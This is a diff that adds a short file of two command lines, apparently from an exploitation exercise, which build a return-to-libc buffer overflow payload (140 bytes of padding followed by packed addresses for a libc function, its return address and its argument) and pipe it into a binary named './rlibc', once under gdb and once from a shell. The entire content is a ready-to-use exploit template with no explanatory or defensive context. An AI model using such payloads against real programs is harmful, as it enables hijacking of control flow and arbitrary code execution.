@@ -1,0 +1,5 @@
+# Use in gdb
+r < <(python -c "import struct; print('\x00'*128 + '\x00'*12 + struct.pack('<I',libc_func_address) + struct.pack('<I',return_address) + struct.pack('<I',argument_address) )")
+
+# Use in shell
+cat <(python -c "import struct; print('\x00'*128 + '\x00'*12 + struct.pack('<I',libc_func_address) + struct.pack('<I',return_address) + struct.pack('<I',argument_address) )") - | ./rlibc
